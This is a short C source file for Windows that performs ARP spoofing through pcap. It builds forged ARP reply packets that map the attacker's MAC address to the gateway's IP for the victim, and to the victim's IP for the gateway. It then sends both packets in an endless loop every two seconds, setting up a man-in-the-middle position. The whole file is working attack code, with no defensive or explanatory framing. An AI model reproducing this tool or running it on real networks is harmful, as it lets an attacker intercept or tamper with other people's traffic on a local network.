#include "arp_spoof.h"

extern send_params infect_params;

DWORD WINAPI start_spoof(LPVOID lparam)
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2 
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	int condition = 1;
	while (condition)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		Sleep(2000); 
	}
	return 0;
}